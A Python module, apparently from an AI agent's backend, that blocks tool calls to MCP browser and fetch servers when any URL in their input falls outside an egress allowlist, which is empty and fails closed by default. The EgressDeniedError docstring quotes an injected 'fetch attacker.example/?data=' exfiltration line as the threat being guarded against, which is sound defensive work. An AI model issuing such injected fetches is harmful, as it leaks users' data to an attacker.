import re
from urllib.parse import urlparse

from backend.app.config import get_settings

_URL_PATTERN = re.compile(r"https?://[^\s'\"<>]+")


class EgressDeniedError(Exception):
    """A tool call referenced a URL outside the egress allowlist (§5.5's "an
    injected 'fetch attacker.example/?data=' cannot exfiltrate").
    """


def _is_allowed(host: str, allowed_domains: tuple[str, ...]) -> bool:
    host = host.lower()
    return any(host == domain or host.endswith(f".{domain}") for domain in allowed_domains)


def check_url_allowed(url: str) -> None:
    settings = get_settings()
    host = urlparse(url).hostname or ""
    if not _is_allowed(host, settings.egress_allowed_domains):
        raise EgressDeniedError(
            f"URL {url!r} (host {host!r}) is not in the egress allowlist: "
            f"{settings.egress_allowed_domains or '(empty — nothing is allowed)'}"
        )


def check_tool_input_urls(tool_input: dict) -> None:
    """Scan every string value in a tool call's input for URLs and check each
    against the allowlist.

    Generic across MCP servers' differing argument names (`url`, `target`,
    `href`, a URL embedded mid-sentence in a `query` field, ...) rather than
    hard-coding one server's schema — the browser/fetch servers this guards
    aren't under this project's control, so their exact input shape can change.
    `egress_allowed_domains` defaults to empty (§5.5: fails closed, not open) —
    every URL is denied until domains are explicitly configured.
    """
    for value in tool_input.values():
        if isinstance(value, str):
            for match in _URL_PATTERN.finditer(value):
                check_url_allowed(match.group(0))
